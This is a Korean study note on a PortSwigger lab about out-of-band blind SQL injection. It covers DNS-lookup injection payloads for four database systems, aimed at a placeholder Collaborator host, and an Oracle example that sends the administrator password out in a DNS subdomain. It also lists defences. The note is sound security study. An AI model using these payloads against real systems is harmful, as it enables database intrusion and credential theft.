# Lab: Blind SQL injection with out-of-band interaction

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — Blind / Out-of-band (OOB)
- **링크**: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
- **참고**: https://portswigger.net/web-security/sql-injection/cheat-sheet
- **상태**: Burp Collaborator 미사용 플랜으로 실습 완료 불가 — 개념 학습으로 대체

## 목표

SQL injection을 통해 DB 서버가 외부 도메인으로 DNS 요청을 보내도록 유도하여, Burp Collaborator에서 수신된 요청으로 취약점 존재를 확인한다.

## 이전 랩들과의 차이

| 항목 | 011~015 (In-band / Blind) | 016 (Out-of-band) |
|------|--------------------------|-------------------|
| 단서 위치 | HTTP 응답 (내용·코드·시간) | **외부 서버로 나가는 네트워크 요청** |
| 응답 관찰 | 같은 채널(HTTP 응답)에서 확인 | 별도 채널(DNS·HTTP)에서 수신 |
| 필요 도구 | 없음 (Python 스크립트) | Burp Collaborator 또는 외부 수신 서버 |
| 적용 환경 | 응답에 어떤 차이라도 있는 경우 | 응답에 **아무 차이가 없고** 시간 측정도 불가한 경우 |

Out-of-band는 응답 내용·상태 코드·응답 시간 등 **어떤 HTTP 응답 차이도 없는 환경**에서 마지막으로 시도하는 방법이다.

## 동작 원리

```
공격자 페이로드 삽입
      ↓
DB 서버가 DNS 조회 실행
      ↓
DNS 요청이 Burp Collaborator 도메인으로 전송
      ↓
Burp Collaborator가 DNS 수신 확인
      ↓
취약점 존재 확인 완료
```

DB 서버가 인터넷에 직접 DNS 요청을 보낼 수 있는 환경이어야 성공한다. 내부망 격리나 방화벽이 있으면 차단된다.

## Burp Collaborator란

Burp Suite Professional에서 제공하는 외부 수신 서버다.

- 고유한 서브도메인을 생성해준다. (예: `abcd1234.burpcollaborator.net`)
- DB 서버가 이 도메인으로 DNS 또는 HTTP 요청을 보내면 수신 내역을 Burp에서 확인할 수 있다.
- **Burp Suite Community Edition에서는 사용 불가** → 이 랩을 직접 풀려면 Pro 플랜 필요

## DBMS별 DNS Lookup 페이로드

[PortSwigger Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)의 DNS Lookup 항목 기준.

### Oracle

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR_DOMAIN/"> %remote;]>'),'/l') FROM DUAL--
```

또는 권한이 있는 경우:

```sql
' EXEC master..xp_dirtree '//COLLABORATOR_DOMAIN/a'--
```

### Microsoft SQL Server

```sql
'; exec master..xp_dirtree '//COLLABORATOR_DOMAIN/a'--
```

### PostgreSQL

```sql
'; copy (SELECT '') to program 'nslookup COLLABORATOR_DOMAIN'--
```

### MySQL (Windows 환경)

```sql
' LOAD FILE('\\\\COLLABORATOR_DOMAIN\\a')--
```

| DBMS | 방법 | 필요 권한 |
|------|------|-----------|
| Oracle | `EXTRACTVALUE` + XML External Entity | 기본 권한으로 가능한 경우 있음 |
| MSSQL | `xp_dirtree` | sysadmin 또는 해당 권한 필요 |
| PostgreSQL | `COPY TO PROGRAM` | superuser 권한 필요 |
| MySQL | `LOAD FILE` | FILE 권한 + Windows 환경 필요 |

## 핵심 정리

- Out-of-band SQLi는 HTTP 응답에서 아무 차이도 관찰할 수 없을 때 **외부 네트워크 채널**을 통해 취약점을 확인하는 방법이다.
- DB 서버가 외부 DNS/HTTP 요청을 보낼 수 있어야 하고, 이를 수신할 Burp Collaborator 같은 외부 서버가 필요하다.
- DBMS마다 DNS 요청을 유발하는 함수·구문이 다르며 필요한 권한 수준도 다르다.
- **방어**: DB 서버의 아웃바운드 네트워크 접근 차단, Prepared Statement 사용, DB 계정 권한 최소화.

## 배운 점 및 추가 학습

### 1. SQL Injection 기법 전체 흐름 정리 (001~016)

지금까지 학습한 SQLi 기법을 단서 유형과 추출 가능 여부로 정리한다.

| 분류 | 단서 | 랩 | 데이터 추출 |
|------|------|-----|------------|
| UNION 기반 | 쿼리 결과 직접 출력 | 003~010 | 직접 가능 |
| Blind — Conditional Responses | 응답 내용 차이 | 011 | 이진 탐색 |
| Blind — Conditional Errors | HTTP 상태 코드 차이 | 012 | 이진 탐색 |
| Visible Error-based | 에러 메시지 직접 노출 | 013 | 직접 파싱 |
| Blind — Time-based | 응답 시간 차이 | 014·015 | 이진 탐색 |
| Out-of-band | 외부 네트워크 요청 | 016 | DNS에 데이터 포함 가능 |

### 2. Out-of-band 데이터 추출 (다음 랩 017 예고)

이 랩(016)은 DNS 요청 발생 자체로 취약점을 확인하는 것이 목표다. 다음 랩(017)에서는 DNS 요청에 실제 데이터를 담아 추출하는 방법을 다룬다.

```sql
-- Oracle 예시: DNS 서브도메인에 password를 포함시켜 전송
' UNION SELECT EXTRACTVALUE(xmltype('...http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR_DOMAIN/...'),'/l') FROM DUAL--
```

Collaborator에서 수신된 DNS 요청의 서브도메인 부분에 비밀번호가 포함되어 있다.

### 3. Burp Collaborator 없이 테스트하는 방법

Community Edition 사용자도 유사한 테스트를 할 수 있는 대안이 있다.

| 도구 | 설명 |
|------|------|
| [interactsh](https://github.com/projectdiscovery/interactsh) | 오픈소스 OOB 수신 서버, 무료 |
| [webhook.site](https://webhook.site) | HTTP 요청 수신 확인용 웹 서비스 |
| 직접 운영 서버 | VPS에 `tcpdump`로 DNS/HTTP 수신 확인 |

### 4. 추가로 고민해볼 것

- DB 서버가 방화벽으로 아웃바운드를 차단하면 Out-of-band 공격은 불가능하다. 이것이 가장 효과적인 방어 수단 중 하나다.
- `xp_dirtree`(MSSQL), `COPY TO PROGRAM`(PostgreSQL) 등 시스템 명령 실행 기능을 활용하므로, 이 권한의 부여 여부가 Out-of-band 가능성을 결정한다.
- DNS 기반 추출은 도메인 길이 제한(최대 253자)이 있어 긴 데이터를 한 번에 추출하기 어렵다. 여러 번 나눠서 전송하거나 HTTP 기반 전송을 사용한다.
